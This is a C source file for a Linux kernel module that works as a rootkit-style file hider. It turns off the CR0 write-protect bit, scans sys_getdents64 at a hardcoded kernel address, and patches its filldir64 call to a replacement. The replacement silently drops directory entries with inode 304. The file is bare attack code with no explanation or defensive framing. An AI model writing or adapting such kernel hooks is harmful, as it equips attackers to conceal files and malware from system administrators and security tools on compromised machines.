#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <asm/unistd.h>
#include <asm/uaccess.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/dirent.h>

extern asmlinkage long sys_getdents64(unsigned int fd,
					struct linux_dirent64 __user *dirent,
					unsigned int count);
MODULE_LICENSE("GPL");

static unsigned orig_cr0;
unsigned int clearcr0(void)
{
	unsigned int cr0 = 0;
	unsigned int ret;
	asm volatile ("movl %%cr0, %%eax"
			: "=a"(cr0));
	ret = cr0;
	
	cr0 &= 0xfffeffff;
	
	asm volatile ("movl %%eax, %%cr0"
			:: "a"(cr0));
	return ret;

}

void resumecr0(unsigned int value)
{
	asm volatile ("movl %%eax, %%cr0"
			:: "a"(value));
}



static filldir_t orig_filldir64;
int new_filldir64(void *__buf, const char *name, int namlen, loff_t offset,
			u64 ino, unsigned int d_type)
{
	if (ino == (u64)304)
		return 0;

	return orig_filldir64(__buf, name, namlen, offset, ino, d_type);
}

unsigned int ih(unsigned int start, unsigned int feature, unsigned int new)
{
	unsigned char *p;
	unsigned int *offset, save;
	int i;

	printk(KERN_ALERT "search form 0x%x\n", start);
	for (p = (unsigned char *)start, i = 0; i < 512; p++, i++) {
		if (p[0] == (unsigned char)(feature & 0xff)) {
			offset = (unsigned int *)&p[1];
			/* filldir64 address is 0xc0xxxxxx */
			if ((*offset &0xff000000) == (unsigned int)0xc0000000) {
				printk(KERN_ALERT "find filldir64:0x%x\n",
								*offset);
				orig_filldir64 = (filldir_t) *offset;

				save = (unsigned int)offset;
				orig_cr0 = clearcr0();
				*offset = new;
				resumecr0(orig_cr0);

				return save;
			}	
		}
	}
	return 0;
}

static unsigned int offset, start, feature;
static int __init hide_init(void)
{
	start = 0xc04dd457;			//sys_getdents64

	feature = 0xba;				// asm code of "mov xxx, %edx"
	offset = ih(start, (unsigned int)feature,
				(unsigned int)new_filldir64);
	if (offset)
		return 0;

	return -1;
}

static void __exit hide_exit(void)
{
	unsigned int orig_cr0;
	if (offset) {
		orig_cr0 = clearcr0();
		*(unsigned int *)offset = (unsigned int)orig_filldir64;
		resumecr0(orig_cr0);
	}
	
}

module_init(hide_init);
module_exit(hide_exit);
